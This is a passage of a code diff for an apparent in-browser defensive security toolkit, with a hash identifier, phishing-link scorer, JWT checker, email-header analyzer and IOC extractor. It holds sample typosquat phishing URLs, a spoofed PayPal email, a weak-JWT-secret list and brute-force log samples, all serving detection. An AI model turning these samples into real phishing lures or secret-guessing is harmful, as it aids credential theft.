+function identifyHash(h){h=h.trim();const r=[];
+  if(/^\$2[abxy]?\$\d{2}\$[./A-Za-z0-9]{53}$/.test(h))r.push(['bcrypt','Slow, salted password hash. Good choice.','ok']);
+  if(/^\$argon2(id|i|d)\$/.test(h))r.push(['Argon2','Modern memory-hard password hash. Best choice.','ok']);
+  if(/^\$y\$/.test(h))r.push(['yescrypt','Default on modern Linux /etc/shadow. Strong.','ok']);
+  if(/^\$6\$/.test(h))r.push(['SHA-512 crypt','Linux /etc/shadow format. Acceptable with high rounds.','low']);
+  if(/^\$5\$/.test(h))r.push(['SHA-256 crypt','Linux shadow format. Acceptable with high rounds.','low']);
+  if(/^\$1\$/.test(h))r.push(['MD5 crypt','Legacy and weak. Migrate these passwords.','high']);
+  if(/^pbkdf2_sha256\$/.test(h))r.push(['Django PBKDF2-SHA256','Salted and iterated. Acceptable.','ok']);
+  if(/^[a-f0-9]+$/i.test(h)){const m={32:['MD5 or NTLM','Fast hash. Unsafe for passwords; fine only for non-security checksums.','high'],40:['SHA-1','Fast and collision-broken. Avoid for signatures and passwords.','high'],56:['SHA-224 / SHA3-224','Fast hash. Fine for integrity, unsafe for passwords.','low'],64:['SHA-256 / SHA3-256','Fast hash. Fine for file integrity, unsafe for passwords unless salted and stretched.','low'],96:['SHA-384','Fast hash. Fine for integrity.','low'],128:['SHA-512 / BLAKE2b','Fast hash. Fine for integrity, unsafe for passwords.','low']}[h.length];if(m)r.push(m)}
+  if(/^[A-Za-z0-9+/]{43}=$/.test(h))r.push(['SHA-256 (Base64)','32-byte digest in Base64.','low']);
+  if(/^[A-Za-z0-9+/]{27}=$/.test(h))r.push(['SHA-1 (Base64)','20-byte digest in Base64.','high']);
+  return r}
+
+/* ---- phishing URL heuristics ---- */
+const BRANDS=['paypal','apple','icloud','microsoft','office365','outlook','google','gmail','amazon','netflix','facebook','instagram','whatsapp','chase','wellsfargo','bankofamerica','citibank','coinbase','binance','metamask','phantom','robinhood','dropbox','docusign','linkedin','steam','usps','fedex','dhl','adobe','spotify','venmo','cashapp','zelle','stripe','github','x09hub'];
+const SHORT=['bit.ly','tinyurl.com','t.co','goo.gl','is.gd','cutt.ly','rb.gy','ow.ly','buff.ly','shorturl.at','tiny.cc','s.id','rebrand.ly','t.ly','bl.ink'];
+const BAD_TLD=['zip','mov','top','xyz','tk','ml','ga','cf','gq','click','country','work','rest','fit','cam','quest','buzz','icu','cyou','sbs','support','lol','monster','bond'];
+const W={crit:40,high:25,med:12,low:5,info:0,ok:0};
+const deLeetHost=s=>s.replace(/rn/g,'m').replace(/vv/g,'w').replace(/0/g,'o').replace(/[1l|]/g,'l').replace(/3/g,'e').replace(/4/g,'a').replace(/5/g,'s').replace(/7/g,'t');
+function analyzeUrl(raw){
+  let s=refang(String(raw).trim());const f=[],pass=[];
+  if(/^(javascript|data|vbscript):/i.test(s))return{f:[{sev:'crit',title:`${s.split(':')[0]}: URL`,detail:'This link runs code or embeds content instead of opening a website. Never click it.'}],pass,score:100,parts:null};
+  if(!/^[a-z][a-z0-9+.-]*:\/\//i.test(s)){s='http://'+s;f.push({sev:'info',title:'No scheme given',detail:'Assumed http:// to parse the link.'})}
+  let u;try{u=new URL(s)}catch{throw Error('That does not look like a URL. Paste the full link, for example https://example.com/login.')}
+  const host=u.hostname.toLowerCase(),rd=regDomain(host),base=rd.split('.')[0],tld=host.split('.').pop(),full=u.href.toLowerCase();
+  const isIp=/^\d{1,3}(\.\d{1,3}){3}$/.test(host)||host.startsWith('[');
+  if(u.protocol==='http:')f.push({sev:'med',title:'Not encrypted (http)',detail:'Anything typed on this page can be read in transit. Real login pages use https.'});else pass.push('Uses HTTPS');
+  if(isIp)f.push({sev:'high',title:'Host is a raw IP address',detail:'Legitimate services almost never send you to a bare IP.'});
+  if(host.includes('xn--'))f.push({sev:'crit',title:'Punycode / look-alike characters in domain',detail:`The domain uses non-Latin letters (${host}) that can imitate a real brand letter for letter.`});
+  if(/[^\x00-\x7f]/.test(String(raw)))f.push({sev:'high',title:'Non-ASCII characters in the link',detail:'Unicode characters can make one domain look like another.'});
+  if(u.username||u.password||/^[^/]*@/.test(String(raw).replace(/^[a-z]+:\/\//i,'')))f.push({sev:'high',title:'Contains "@" before the host',detail:'Browsers ignore everything before @, so "paypal.com@evil.site" really goes to evil.site.'});
+  const labels=host.split('.');if(!isIp&&labels.length>4)f.push({sev:'med',title:`${labels.length-2} subdomain levels`,detail:'Long chains like login.paypal.com.secure.example.top push the real domain out of view.'});
+  if(!isIp&&BAD_TLD.includes(tld))f.push({sev:'med',title:`High-abuse top-level domain (.${tld})`,detail:'This ending is cheap to register and shows up often in phishing and malware campaigns.'});
+  if(SHORT.includes(host))f.push({sev:'med',title:'Link shortener',detail:'The real destination is hidden. Expand it with a preview service before opening.'});
+  if(!isIp){
+    let brandHit=false;
+    for(const b of BRANDS){
+      if(base===b){pass.push(`Registered domain is ${rd}`);brandHit=true;break}
+      if(deLeetHost(base)===b||(b.length>=5&&lev(base,b)===1)){f.push({sev:'crit',title:`Imitates "${b}"`,detail:`The domain ${rd} is one character away from the real brand. This is a classic typosquat.`});brandHit=true;break}
+      if(base.includes(b)&&base!==b){f.push({sev:'high',title:`Brand "${b}" inside another domain`,detail:`The site belongs to ${rd}, not ${b}. Adding a brand name to a domain is a common trick.`});brandHit=true;break}
+      if(host.replace(rd,'').split(/[.-]/).some(l=>l&&l!==b&&deLeetHost(l)===b)){f.push({sev:'crit',title:`Look-alike spelling of "${b}" in the subdomain`,detail:`The link imitates ${b} with swapped characters, but the site is really ${rd}.`});brandHit=true;break}
+      if((host.replace(rd,'')+u.pathname).toLowerCase().includes(b)){f.push({sev:'high',title:`Brand "${b}" outside the real domain`,detail:`"${b}" appears in a subdomain or path, but the site is really ${rd}.`});brandHit=true;break}
+    }
+    if(!brandHit)pass.push('No brand impersonation detected');
+  }
+  if((base.match(/-/g)||[]).length>=2)f.push({sev:'low',title:'Several hyphens in the domain',detail:'Names like secure-account-verify are typical of throwaway phishing domains.'});
+  const kw=(u.pathname+u.search).toLowerCase().match(/login|signin|verify|verification|secure|update|account|wallet|seed|recovery|unlock|suspend|confirm|billing|password|2fa|invoice/g);
+  if(kw)f.push({sev:'low',title:'Credential-bait words in the path',detail:[...new Set(kw)].join(', ')});
+  if(u.port&&!['80','443'].includes(u.port))f.push({sev:'med',title:`Unusual port :${u.port}`,detail:'Public websites rarely use custom ports.'});
+  for(const [k,v] of u.searchParams){if(/^(url|redirect|redirect_uri|next|return|returnto|goto|dest|continue|r|u)$/i.test(k)&&/^https?:|^\/\//i.test(v)){f.push({sev:'med',title:`Redirect parameter "${k}"`,detail:`Sends you on to ${v}. Attackers abuse redirects on trusted sites to hide the real destination.`});break}}
+  if(full.length>120)f.push({sev:'low',title:`Very long link (${full.length} characters)`,detail:'Long links hide the important part.'});
+  if(((full.match(/%[0-9a-f]{2}/g)||[]).length)>8)f.push({sev:'low',title:'Heavy percent-encoding',detail:'Encoding can hide keywords and destinations.'});
+  if(/\.(exe|scr|js|vbs|hta|iso|img|msi|bat|cmd|apk|lnk)$/i.test(u.pathname))f.push({sev:'high',title:'Direct download of an executable file',detail:u.pathname.split('/').pop()});
+  const score=Math.min(100,f.reduce((a,x)=>a+W[x.sev],0));
+  return {f,pass,score,parts:{scheme:u.protocol.replace(':',''),host,registered:rd,tld,port:u.port||'(default)',path:u.pathname,query:[...u.searchParams].map(([k,v])=>k+'='+v)}};
+}
+
+/* ---- JWT ---- */
+function parseJwt(t){t=t.trim();const p=t.split('.');if(p.length<2||p.length>3)throw Error('A JWT has three parts separated by dots: header.payload.signature.');
+  let h,pl;try{h=JSON.parse(dec.decode(b64urlToBytes(p[0])))}catch{throw Error('The header is not valid Base64URL-encoded JSON.')}
+  try{pl=JSON.parse(dec.decode(b64urlToBytes(p[1])))}catch{throw Error('The payload is not valid Base64URL-encoded JSON.')}
+  return{h,pl,sig:p[2]||'',signing:p[0]+'.'+p[1]}}
+function jwtFindings(h,pl,sig,now=Date.now()/1000){const f=[];const alg=String(h.alg||'');
+  if(!alg||alg.toLowerCase()==='none')f.push({sev:'crit',title:'alg is "none"',detail:'The token is unsigned. Any server that accepts it lets anyone forge identities.'});
+  if(alg.startsWith('HS'))f.push({sev:'info',title:`Symmetric signature (${alg})`,detail:'Anyone who knows the secret can mint tokens. Use a long random secret, or RS256/ES256 when other services verify tokens.'});
+  if(alg&&alg!=='none'&&!sig)f.push({sev:'high',title:'Signature is missing',detail:'The token names an algorithm but has no signature part.'});
+  for(const k of['jku','x5u','jwk'])if(h[k])f.push({sev:'high',title:`Header contains "${k}"`,detail:'Key location supplied by the token itself. The server must ignore it or pin trusted keys, or attackers can sign with their own key.'});
+  if(h.kid&&/\.\.|['";|]/.test(String(h.kid)))f.push({sev:'high',title:'Suspicious "kid" value',detail:`kid = ${h.kid}. Path or injection characters suggest a key-lookup attack.`});
+  if(pl.exp===undefined)f.push({sev:'high',title:'No expiry (exp)',detail:'A stolen token would work forever.'});
+  else if(pl.exp<now)f.push({sev:'med',title:'Token has expired',detail:'Expired '+new Date(pl.exp*1000).toLocaleString()});
+  if(pl.exp&&pl.iat&&pl.exp-pl.iat>86400)f.push({sev:'med',title:`Long lifetime (${fmtDur(pl.exp-pl.iat)})`,detail:'Access tokens should usually live minutes to hours. Use refresh tokens for longer sessions.'});
+  if(pl.iat&&pl.iat>now+300)f.push({sev:'med',title:'Issued in the future (iat)',detail:'Clock skew or a forged token.'});
+  if(pl.nbf&&pl.nbf>now)f.push({sev:'info',title:'Not valid yet (nbf)',detail:'Becomes valid '+new Date(pl.nbf*1000).toLocaleString()});
+  const sens=Object.keys(pl).filter(k=>/pass|secret|ssn|card|cvv|pin$|private|api_?key/i.test(k));
+  if(sens.length)f.push({sev:'high',title:'Sensitive fields in the payload',detail:`${sens.join(', ')}. JWT payloads are encoded, not encrypted. Anyone holding the token can read them.`});
+  if(!pl.aud)f.push({sev:'low',title:'No audience (aud)',detail:'Without aud, a token issued for one service may be accepted by another.'});
+  return f}
+const WEAK_SECRETS=['secret','password','123456','changeme','your-256-bit-secret','jwt_secret','jwtsecret','secretkey','secret123','key','test','admin','supersecret','mysecret','default'];
+
+/* ---- console routing ---- */
+function detectTool(t){const s=t.trim();if(!s)return null;
+  if(/^eyJ[\w-]+\.[\w-]+\.[\w-]*$/.test(s))return'jwt';
+  if(/^Received:|^Return-Path:|^Authentication-Results:|^DKIM-Signature:/im.test(s))return'email';
+  if(/sshd\[\d+\]|"(GET|POST|PUT|HEAD|DELETE) \S+ HTTP\//.test(s))return'logs';
+  if(/^HTTP\/[\d.]+ \d{3}/i.test(s)||/^(strict-transport-security|content-security-policy|x-frame-options|server|set-cookie):/im.test(s))return'headers';
+  if(/^\d{1,3}(\.\d{1,3}){3}(\s*\/\s*\d{1,2}|\s+\d{1,3}(\.\d{1,3}){3})?$/.test(s))return'subnet';
+  if(identifyHash(s).length&&!/\s/.test(s))return'hash';
+  if(/^X09v1\./.test(s))return'vault';
+  if(!/\s/.test(s)&&(/^(https?|hxxps?):\/\//i.test(s)||/^[\w-]+(\[?\.\]?[\w-]+)+\.[a-z]{2,}(\/\S*)?$/i.test(s)))return'phish';
+  if(/\n/.test(s)||/hxxp|\[\.\]/.test(s))return'ioc';
+  if(/^[A-Za-z0-9+/=_-]{12,}$/.test(s)&&s.length%4===0)return'codec';
+  return'password'}
+</script>
+
+<script src="/x09/x09-space.js"></script>
+
+<script>
+/* ===== UI ===== */
+const $=(s,r=document)=>r.querySelector(s), $$=(s,r=document)=>[...r.querySelectorAll(s)];
+const SEV_ORDER=['crit','high','med','low','info','ok'];
+const SEV_LABEL={crit:'CRITICAL',high:'HIGH',med:'MEDIUM',low:'LOW',info:'INFO',ok:'PASS'};
+let cleanup=null;
+
+function findingsHTML(list){if(!list.length)return'<p class="muted">No issues found.</p>';
+  return'<ul class="findings">'+[...list].sort((a,b)=>SEV_ORDER.indexOf(a.sev)-SEV_ORDER.indexOf(b.sev)).map(x=>`<li class="f s-${x.sev}"><span class="sev">${SEV_LABEL[x.sev]}</span><div><b>${esc(x.title)}</b>${x.detail?`<p>${esc(x.detail)}</p>`:''}</div></li>`).join('')+'</ul>'}
+function countsHTML(list){const c={};list.forEach(x=>c[x.sev]=(c[x.sev]||0)+1);return'<div class="counts">'+SEV_ORDER.filter(k=>c[k]&&k!=='ok').map(k=>`<span class="sev s-${k}">${c[k]} ${SEV_LABEL[k]}</span>`).join('')+'</div>'}
+function verdictHTML(big,sev,title,sub){return`<div class="verdict"><div class="big s-${sev}">${big}</div><div class="stack" style="gap:4px"><div class="vt s-${sev}">${esc(title)}</div>${sub?`<div class="muted small">${sub}</div>`:''}</div></div>`}
+function errHTML(m){return`<div class="banner s-crit">${esc(m)}</div>`}
+function copy(text,btn){const done=l=>{if(!btn)return;const o=btn.textContent;btn.textContent=l;setTimeout(()=>btn.textContent=o,1400)};
+  try{navigator.clipboard.writeText(text).then(()=>done('Copied'),()=>done('Select and copy'))}catch{done('Select and copy')}}
+function kvHTML(obj){return'<dl class="kv">'+Object.entries(obj).map(([k,v])=>`<dt>${esc(k)}</dt><dd>${v}</dd>`).join('')+'</dl>'}
+function store(k,v){try{if(v===undefined)return JSON.parse(localStorage.getItem('x09d.'+k));localStorage.setItem('x09d.'+k,JSON.stringify(v))}catch{return null}}
+
+/* ---------- TOOLS ---------- */
+const TOOLS=[];
+const T=(o)=>TOOLS.push(o);
+
+T({id:'console',cat:'Home',gl:'◎',name:'Defense Console',desc:'Paste anything suspicious and X09 Defense routes it to the right tool.',render(root){
+  const groups=[...new Set(TOOLS.filter(t=>t.id!=='console').map(t=>t.cat))];
+  root.innerHTML=`<div class="stack" style="gap:26px">
+    <div class="stack">
+      <label class="lbl" for="tri">Paste a link, email headers, a log, a token, a hash, an IP range or a password</label>
+      <div class="console-box"><textarea id="tri" spellcheck="false" placeholder="paste anything suspicious"></textarea></div>
+      <div class="row"><button class="btn" id="tri-go" data-magnet>Analyze</button><span class="muted small" id="tri-hint">X09 Defense detects what you pasted and opens the matching tool.</span></div>
+      <div class="chips" id="tri-ex"></div>
+    </div>
+    <div class="stat"><div><b>${TOOLS.length-1}</b>defense tools</div><div><b>0 bytes</b>sent to a server</div><div><b>100%</b>in-browser crypto</div></div>
+    ${groups.map(g=>`<section><h3>${g}</h3><div class="g3">${TOOLS.filter(t=>t.cat===g).map(t=>`<a class="tool-card" href="#${t.id}" data-tilt><span class="gl">${t.gl}</span><b>${t.name}</b><span>${t.desc}</span></a>`).join('')}</div></section>`).join('')}
+  </div>`;
+  const ex=[['Suspicious link','http://paypa1-secure.account-verify.top/login?next=https://paypal.com'],['Server log',SAMPLE_LOG],['Email headers',SAMPLE_EMAIL],['IP range','10.20.4.17/22'],['Password hash','5f4dcc3b5aa765d61d8327deb882cf99']];
+  const box=$('#tri',root),hint=$('#tri-hint',root);
+  $('#tri-ex',root).innerHTML=ex.map((e,i)=>`<button class="chip" data-i="${i}">${e[0]}</button>`).join('');
+  $('#tri-ex',root).onclick=e=>{const b=e.target.closest('[data-i]');if(b){box.value=ex[b.dataset.i][1];box.dispatchEvent(new Event('input'))}};
+  box.oninput=()=>{const id=detectTool(box.value);const t=TOOLS.find(x=>x.id===id);hint.textContent=t?`Detected: opens ${t.name}`:'X09 Defense detects what you pasted and opens the matching tool.'};
+  $('#tri-go',root).onclick=()=>{const id=detectTool(box.value);if(id)go(id,box.value.trim());else hint.textContent='Paste something first.'};
+}});
+
+/* THREAT ANALYSIS */
+T({id:'phish',cat:'Threat analysis',gl:'⚑',name:'Phishing Link Scanner',desc:'Score a link for typosquats, look-alike characters, hidden redirects and bait words.',render(root,input){
+  root.innerHTML=`<div class="stack">
+    <div><label class="lbl" for="ph-in">Link to inspect (defanged links like hxxp://site[.]com work too)</label>
+    <div class="row"><input id="ph-in" class="inp grow" spellcheck="false" autocomplete="off"><button class="btn" id="ph-go">Scan link</button></div></div>
+    <div class="chips" id="ph-ex"></div><div id="ph-out" class="stack"></div></div>`;
+  const ex=['http://paypa1-secure.account-verify.top/login?next=https://paypal.com','https://xn--pypal-4ve.com/signin','http://185.234.72.19:8080/wallet/seed-recovery.html','https://accounts.google.com/signin','https://bit.ly/3xY9aQz'];
+  const inp=$('#ph-in',root),out=$('#ph-out',root);
+  $('#ph-ex',root).innerHTML=ex.map(u=>`<button class="chip" title="${esc(u)}">${esc(u)}</button>`).join('');
+  $('#ph-ex',root).onclick=e=>{if(e.target.matches('.chip')){inp.value=e.target.title;run()}};
+  function run(){try{const r=analyzeUrl(inp.value);const s=r.score;
+    const [sev,t]=s>=60?['crit','Likely phishing or malicious']:s>=30?['high','Suspicious']:s>=10?['med','Use caution']:['ok','No strong phishing signals'];
+    out.innerHTML=verdictHTML(s,sev,t,`Risk score out of 100 · ${r.f.filter(x=>x.sev!=='info').length} warning signs`)+
+      `<div class="io"><div class="stack"><h3>Warning signs</h3>${findingsHTML(r.f)}${r.pass.length?`<h3 style="margin-top:6px">Checks passed</h3>${findingsHTML(r.pass.map(p=>({sev:'ok',title:p})))}`:''}</div>
+      ${r.parts?`<div class="card"><h3>Link anatomy</h3>${kvHTML({Scheme:esc(r.parts.scheme),Host:esc(r.parts.host),'Real domain':`<b>${esc(r.parts.registered)}</b>`,Port:esc(r.parts.port),Path:esc(r.parts.path),Query:r.parts.query.length?r.parts.query.map(esc).join('<br>'):'(none)',Defanged:`<code>${esc(defang(inp.value.trim()))}</code>`})}<p class="muted small" style="margin-top:12px">The real domain is what your browser actually connects to. Everything before it can be chosen freely by whoever made the link.</p></div>`:''}</div>`;
+  }catch(e){out.innerHTML=errHTML(e.message)}}
+  $('#ph-go',root).onclick=run;inp.onkeydown=e=>{if(e.key==='Enter')run()};
+  inp.value=input||ex[0];run();
+}});
+
+const SAMPLE_EMAIL=`Return-Path: <bounce-7731@mailer.secure-notice.top>
+Received: from mx.example.com (mx.example.com [10.0.4.12])
+	by inbox.example.com with LMTP id 7Hc2
+	; Mon, 28 Sep 2026 14:02:53 -0500
+Received: from mailer.secure-notice.top (unknown [185.234.72.19])
+	by mx.example.com (Postfix) with ESMTP id 4F2A91C0
+	for <jordan@example.com>; Mon, 28 Sep 2026 14:02:51 -0500
+Received: from localhost (localhost [127.0.0.1])
+	by mailer.secure-notice.top (Postfix) with SMTP id 9A1
+	; Mon, 28 Sep 2026 19:02:44 +0000
+Authentication-Results: mx.example.com;
+	spf=fail (sender IP is 185.234.72.19) smtp.mailfrom=secure-notice.top;
+	dkim=none (message not signed);
+	dmarc=fail action=quarantine header.from=paypal.com
+From: "PayPal Security" <service@paypal.com>
+Reply-To: account-review@secure-notice.top
+To: jordan@example.com
+Subject: Urgent: unusual sign-in detected, verify your account within 24 hours
+Date: Mon, 28 Sep 2026 19:02:40 +0000
+Message-ID: <20260928190240.9A1@mailer.secure-notice.top>
+X-Mailer: PHPMailer 6.1.4`;
+
+T({id:'email',cat:'Threat analysis',gl:'✉',name:'Email Header Analyzer',desc:'Trace delivery hops and check SPF, DKIM, DMARC and sender spoofing.',render(root,input){
+  root.innerHTML=`<div class="stack"><div><label class="lbl" for="em-in">Raw email headers (Gmail: ⋮ → Show original. Outlook: File → Properties → Internet headers)</label>
+    <textarea id="em-in" spellcheck="false"></textarea></div><div class="row"><button class="btn" id="em-go">Analyze headers</button><button class="btn ghost" id="em-s">Load sample</button></div><div id="em-out" class="stack"></div></div>`;
+  const inp=$('#em-in',root),out=$('#em-out',root);
+  function run(){const raw=inp.value.replace(/\r\n/g,'\n').replace(/\n[ \t]+/g,' ');const H=[];
+    raw.split('\n').forEach(l=>{const m=l.match(/^([\w-]+):\s*(.*)$/);if(m)H.push([m[1].toLowerCase(),m[2]])});
+    if(!H.length){out.innerHTML=errHTML('No headers found. Paste the full header block, starting with lines like "Received:" and "From:".');return}
+    const get=k=>(H.find(h=>h[0]===k)||[])[1]||'',all=k=>H.filter(h=>h[0]===k).map(h=>h[1]);
+    const addr=s=>(s.match(/<([^>]+)>/)||[,s.trim()])[1],dom=s=>regDomain((addr(s).split('@')[1]||'').replace(/>$/,''));
+    const from=get('from'),rp=get('return-path'),reply=get('reply-to'),mid=get('message-id'),auth=all('authentication-results').join(' ; ')+' '+all('arc-authentication-results').join(' ');
+    const fd=dom(from),f=[];
+    const res=k=>{const m=auth.match(new RegExp('\\b'+k+'=(\\w+)','i'));return m?m[1].toLowerCase():null};
+    const spf=res('spf'),dkim=res('dkim'),dmarc=res('dmarc');
+    const judge=(n,v,why)=>{if(!v)f.push({sev:'low',title:`${n} result not recorded`,detail:'The receiving server did not add an Authentication-Results line for this check.'});else if(v==='pass')f.push({sev:'ok',title:`${n} pass`});else f.push({sev:v==='softfail'||v==='neutral'?'med':'high',title:`${n} ${v}`,detail:why})};
+    judge('SPF',spf,'The sending server is not authorized to send mail for this domain.');
+    judge('DKIM',dkim,'The message has no valid cryptographic signature from the sender domain.');
+    judge('DMARC',dmarc,'The visible From domain failed alignment. This is the strongest sign of spoofing.');
+    if(rp&&fd&&dom(rp)!==fd)f.push({sev:'med',title:'Return-Path domain differs from From',detail:`Bounces go to ${dom(rp)} but the message claims to be from ${fd}. Common with marketing services; suspicious for banks and payment providers.`});
+    if(reply&&fd&&dom(reply)!==fd)f.push({sev:'high',title:'Reply-To points to a different domain',detail:`Replies go to ${addr(reply)} instead of ${fd}. Attackers use this to capture your response.`});
+    const disp=(from.match(/^"?([^"<]+)"?\s*</)||[])[1]||'';const b=BRANDS.find(x=>disp.toLowerCase().replace(/\s/g,'').includes(x));
+    if(b&&regDomain(fd).split('.')[0]!==b)f.push({sev:'high',title:`Display name claims "${disp.trim()}"`,detail:`But the sending domain is ${fd}.`});
+    if(mid&&fd){const md=regDomain((mid.match(/@([^>]+)/)||[])[1]||'');if(md&&md!==fd)f.push({sev:'low',title:'Message-ID from another domain',detail:`Generated by ${md}, not ${fd}.`})}
+    const xm=get('x-mailer');if(/phpmailer|swiftmailer|python|sendblaster|atomic|mass/i.test(xm))f.push({sev:'low',title:'Bulk or script mailer',detail:xm});
+    const subj=get('subject');if(/urgent|immediately|suspend|verify|unusual|locked|within 24|final notice|action required|password expir/i.test(subj))f.push({sev:'low',title:'Pressure language in the subject',detail:subj});
+    const hops=all('received').reverse().map(r=>{const date=r.includes(';')?r.slice(r.lastIndexOf(';')+1).trim():'';const ip=(r.match(/\[((?:\d{1,3}\.){3}\d{1,3}|[0-9a-f:]+)\]/i)||[])[1]||'';
+      return{from:(r.match(/from\s+(\S+)/i)||[])[1]||'?',by:(r.match(/by\s+(\S+)/i)||[])[1]||'?',ip,t:Date.parse(date)}});
+    const ext=hops.find(h=>h.ip&&ipToInt(h.ip)!==null&&ipScope(ipToInt(h.ip))==='Public');
+    if(ext)f.push({sev:'info',title:`Originating public IP ${ext.ip}`,detail:`First external server: ${ext.from}. Look it up in your threat intel or with a WHOIS service.`});
+    const score=Math.min(100,f.reduce((a,x)=>a+W[x.sev],0));
+    const [sev,t]=score>=50?['crit','Likely spoofed or phishing']:score>=25?['high','Suspicious sender']:score>=10?['med','Minor concerns']:['ok','Sender checks look clean'];
+    out.innerHTML=verdictHTML(score,sev,t,`From ${esc(from||'(missing)')}`)+`<div class="io"><div class="stack"><h3>Findings</h3>${findingsHTML(f)}</div>
+      <div class="stack"><h3>Delivery path (oldest first)</h3><div class="tbl-wrap"><table><thead><tr><th>#</th><th>From</th><th>By</th><th>IP</th><th>Delay</th></tr></thead><tbody>${hops.map((h,i)=>{const d=i&&!isNaN(h.t)&&!isNaN(hops[i-1].t)?Math.round((h.t-hops[i-1].t)/1000):null;return`<tr><td>${i+1}</td><td>${esc(h.from)}</td><td>${esc(h.by)}</td><td>${esc(h.ip||'—')}${h.ip&&ipToInt(h.ip)!==null?`<br><span class="muted small">${ipScope(ipToInt(h.ip))}</span>`:''}</td><td>${d===null?'—':d<0?`<span class="s-med">${d}s</span>`:d+'s'}</td></tr>`}).join('')||'<tr><td colspan="5" class="muted">No Received lines found.</td></tr>'}</tbody></table></div>
+      <div class="card">${kvHTML({From:esc(from||'—'),'Reply-To':esc(reply||'—'),'Return-Path':esc(rp||'—'),Subject:esc(subj||'—'),Date:esc(get('date')||'—')})}</div></div></div>`}
+  $('#em-go',root).onclick=run;$('#em-s',root).onclick=()=>{inp.value=SAMPLE_EMAIL;run()};
+  inp.value=input||SAMPLE_EMAIL;run();
+}});
+
+T({id:'ioc',cat:'Threat analysis',gl:'⌖',name:'IOC Extractor',desc:'Pull IPs, domains, URLs, hashes, CVEs and ATT&CK IDs out of any report or alert.',render(root,input){
+  const sample=`Alert 4471 — Suspicious outbound traffic from FIN-LT-022
+Beacon to hxxps://cdn-update[.]sync-cloud[.]top/api/v2/check every 60s via 185.234.72.19 and 45.155.205.12
+Dropped file: invoice_0928.iso  SHA256 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08
+MD5 5d41402abc4b2a76b9719d911017c592. Internal host 10.20.4.17 contacted update.sync-cloud.top.
+Phishing sender: billing@secure-notice.top. Exploits CVE-2024-3400 and CVE-2023-4966. TTPs: T1566.001, T1059.001, T1071.`;
+  root.innerHTML=`<div class="io"><div class="stack"><div><label class="lbl" for="io-in">Threat report, alert, email or log text</label><textarea id="io-in" spellcheck="false" style="min-height:260px"></textarea></div>
+    <div class="row"><label class="check"><input type="checkbox" id="io-priv"> Include private IPs</label><label class="check"><input type="checkbox" id="io-def" checked> Defang output</label></div></div>
+    <div class="stack"><div class="row"><h3 style="margin:0">Indicators</h3><span style="flex:1"></span><button class="btn ghost sm" id="io-c">Copy list</button><button class="btn ghost sm" id="io-csv">Copy CSV</button></div><div id="io-out" class="stack"></div></div></div>`;
+  const inp=$('#io-in',root),out=$('#io-out',root);let rows=[];
+  const FILE_EXT=/^(exe|dll|txt|log|js|py|php|html?|png|jpe?g|gif|pdf|docx?|xlsx?|iso|img|lnk|bat|ps1|sh|json|xml|csv|tmp|bin|dat)$/i;
+  function run(){const t=refang(inp.value),def=$('#io-def',root).checked,priv=$('#io-priv',root).checked;const R={};
+    const add=(k,v,tag='')=>{R[k]=R[k]||new Map();if(!R[k].has(v))R[k].set(v,tag)};
+    (t.match(/\bhttps?:\/\/[^\s"'<>()\]]+/gi)||[]).forEach(u=>add('URLs',u.replace(/[.,;]+$/,'')));
+    (t.match(/\b[\w.+-]+@[a-z0-9-]+(?:\.[a-z0-9-]+)*\.[a-z]{2,}\b/gi)||[]).forEach(e=>add('Email addresses',e.toLowerCase()));
+    (t.match(/\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b/g)||[]).forEach(ip=>{const sc=ipScope(ipToInt(ip));if(priv||sc==='Public'||sc.startsWith('Doc'))add('IPv4 addresses',ip,sc)});
+    (t.match(/\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24}\b/gi)||[]).forEach(d=>{d=d.toLowerCase();const tld=d.split('.').pop();if(!FILE_EXT.test(tld)&&!/^\d+(\.\d+)+$/.test(d))add('Domains',d)});
+    (t.match(/\b[a-f0-9]{32,128}\b/gi)||[]).forEach(h=>{const n={32:'MD5',40:'SHA-1',64:'SHA-256',128:'SHA-512'}[h.length];if(n)add('File hashes',h.toLowerCase(),n)});
+    (t.match(/\bCVE-\d{4}-\d{4,7}\b/gi)||[]).forEach(c=>add('CVEs',c.toUpperCase()));
+    (t.match(/\bT\d{4}(?:\.\d{3})?\b/g)||[]).forEach(c=>add('MITRE ATT&CK',c));
+    const shown=v=>def&&/URLs|Domains|IPv4|Email/.test(v[0])?defang(v[1]):v[1];
+    rows=[];Object.entries(R).forEach(([k,m])=>m.forEach((tag,v)=>rows.push([k,v,tag])));
+    out.innerHTML=rows.length?Object.entries(R).map(([k,m])=>`<div class="card"><h3>${k} · ${m.size}</h3><div class="tbl-wrap" style="border:0"><table><tbody>${[...m].map(([v,tag])=>`<tr><td style="padding-left:0"><code>${esc(shown([k,v]))}</code></td><td class="muted small" style="text-align:right">${esc(tag)}</td></tr>`).join('')}</tbody></table></div></div>`).join(''):'<p class="muted">No indicators found yet.</p>';
+    rows=rows.map(r=>[r[0],shown(r),r[2]])}
+  inp.oninput=run;$('#io-def',root).onchange=run;$('#io-priv',root).onchange=run;
+  $('#io-c',root).onclick=e=>copy(rows.map(r=>r[1]).join('\n'),e.target);
+  $('#io-csv',root).onclick=e=>copy('type,indicator,note\n'+rows.map(r=>r.map(x=>'"'+String(x).replace(/"/g,'""')+'"').join(',')).join('\n'),e.target);
+  inp.value=input||sample;run();
+}});
+
+const SAMPLE_LOG=['Sep 28 03:14:07 web01 sshd[2211]: Failed password for invalid user admin from 203.0.113.45 port 51122 ssh2',
+'Sep 28 03:14:09 web01 sshd[2211]: Failed password for invalid user oracle from 203.0.113.45 port 51130 ssh2',
+'Sep 28 03:14:12 web01 sshd[2213]: Failed password for root from 203.0.113.45 port 51144 ssh2',
+'Sep 28 03:14:15 web01 sshd[2213]: Failed password for root from 203.0.113.45 port 51150 ssh2',
+'Sep 28 03:14:18 web01 sshd[2215]: Failed password for invalid user test from 203.0.113.45 port 51161 ssh2',
+'Sep 28 03:14:22 web01 sshd[2215]: Failed password for deploy from 203.0.113.45 port 51170 ssh2',
+'Sep 28 03:14:26 web01 sshd[2217]: Accepted password for deploy from 203.0.113.45 port 51188 ssh2',
+'Sep 28 08:02:41 web01 sshd[3120]: Accepted publickey for jordan from 198.51.100.7 port 60211 ssh2',
+'198.51.100.23 - - [28/Sep/2026:09:12:01 -0500] "GET / HTTP/1.1" 200 5120 "-" "Mozilla/5.0"',
